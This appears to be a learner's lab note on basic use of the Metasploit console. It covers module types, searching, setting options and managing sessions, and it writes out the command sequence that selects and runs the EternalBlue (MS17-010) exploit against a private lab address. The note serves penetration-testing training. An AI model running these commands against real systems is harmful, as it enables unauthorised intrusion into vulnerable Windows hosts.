# Metasploit Framework Foundation - [11-16-2026]

## What This Covers

This execution log documents the foundational usage of the Metasploit Framework command-line interface (`msfconsole`). It covers navigating the modular architecture, searching for exploits, configuring payload parameters, and managing active sessions.

## Key Concepts

*   Differentiating between vulnerabilities (flaws), exploits (code leveraging the flaw), and payloads (code executed on the target), including the distinction between single/inline payloads and staged payloads.
*   Understanding Metasploit's modular structure, which categorizes tools into Auxiliary (scanners), Exploits, Payloads, Encoders, Evasion, NOPs, and Post-exploitation modules.
*   Operating within context-specific prompts in `msfconsole` to isolate parameter configurations.
*   Utilizing the `search` function to find modules based on CVEs, names, or types, and evaluating their reliability based on their assigned "Rank".
*   Managing the communication channels (sessions) established between the attacker and the target system after a successful exploit.

## Commands/Tools Used

```bash
# Launching the interface:
msfconsole

# Searching and selecting modules:
search ms17-010
use exploit/windows/smb/ms17_010_eternalblue
info

# Configuring parameters:
show options
show payloads
set RHOSTS 10.10.165.39
setg LPORT 4444

# Execution and Session Management:
exploit -z
sessions
sessions -i 2
background
```

## What I learned

I learned how to navigate and utilize the Metasploit Framework (`msfconsole`) from the command line to support penetration testing engagements. By exploring the modular architecture, I can successfully search for specific exploits and evaluate their reliability. I learned how to review required parameters using `show options` and configure target variables (like `RHOSTS` and `LPORT`) using the `set` and `setg` commands. Finally, I learned how to execute an exploit against a vulnerable service and manage the resulting communication channel, allowing me to interact with active sessions and safely background them to return to the main framework prompt.
